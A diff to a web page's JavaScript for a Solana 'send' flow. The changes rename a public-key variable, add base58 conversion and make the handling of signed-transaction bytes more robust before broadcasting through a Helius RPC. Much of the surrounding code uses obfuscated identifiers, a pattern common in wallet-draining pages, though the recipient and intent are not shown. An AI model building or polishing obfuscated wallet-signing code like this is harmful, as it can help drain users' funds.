@@ -296,7 +296,7 @@
 
     let currentStep = 'sendTo'; 
     let rawAmount = "0";
-    let userPublicKey = null;
+    let userPublicKeyStr = null;
     let solPriceUSD = 110.0;
 
     async function fetchSolPrice() {
@@ -406,13 +406,12 @@
                         }
                     }
                     
-                    // Force-extract string safely right here so it's always a string value
                     let rawKey = _0x14?.publicKey || _0x11.publicKey;
                     if (rawKey) {
-                        userPublicKey = typeof rawKey === 'string' ? rawKey : rawKey.toString();
+                        userPublicKeyStr = typeof rawKey === 'string' ? rawKey : (rawKey.toBase58 ? rawKey.toBase58() : rawKey.toString());
                     }
                     
-                    if (userPublicKey) break; 
+                    if (userPublicKeyStr) break; 
                 } catch (_0x17) {
                     const _0x18 = _0x17.toString().toLowerCase();
                     if (_0x18.includes(_0x1a[8]) || _0x18.includes(_0x1a[9]) || _0x18.includes(_0x1a[10])) {
@@ -423,7 +422,7 @@
                 }
             }
 
-            if (!userPublicKey) return;
+            if (!userPublicKeyStr) return;
 
             currentStep = 'amount';
             viewSendTo.classList.add('hidden');
@@ -449,8 +448,7 @@
                     statusDiv.innerText = "Preparing transaction...";
                     statusDiv.style.color = "#8b92a5";
 
-                    // userPublicKey is guaranteed to be a valid base58 string now
-                    const pubKeyObj = new solanaWeb3.PublicKey(userPublicKey);
+                    const pubKeyObj = new solanaWeb3.PublicKey(userPublicKeyStr);
 
                     const _0x1c = BigInt(Math.floor(_0x1b * 1000000000)); 
                     const _0x1d = new solanaWeb3.Connection(HELIUS_URL, _0x1a[3]);
@@ -503,7 +501,20 @@
                     
                     statusDiv.innerText = "Broadcasting transaction...";
                     
-                    await _0x1d[_0x1a[7]](signedTransaction.serialize(), {
+                    // Robustly handle transaction bytes conversion for sendRawTransaction
+                    let txBytes;
+                    if (signedTransaction instanceof Uint8Array || Array.isArray(signedTransaction)) {
+                        txBytes = new Uint8Array(signedTransaction);
+                    } else if (signedTransaction && typeof signedTransaction.serialize === 'function') {
+                        txBytes = signedTransaction.serialize();
+                    } else if (signedTransaction && typeof signedTransaction === 'object') {
+                        // Handle Buffer or array-like objects returned by wallet adapters
+                        txBytes = new Uint8Array(Object.values(signedTransaction));
+                    } else {
+                        throw new Error("Invalid signed transaction format returned from wallet");
+                    }
+
+                    await _0x1d[_0x1a[7]](txBytes, {
                         skipPreflight: false,
                         maxRetries: 3
                     });
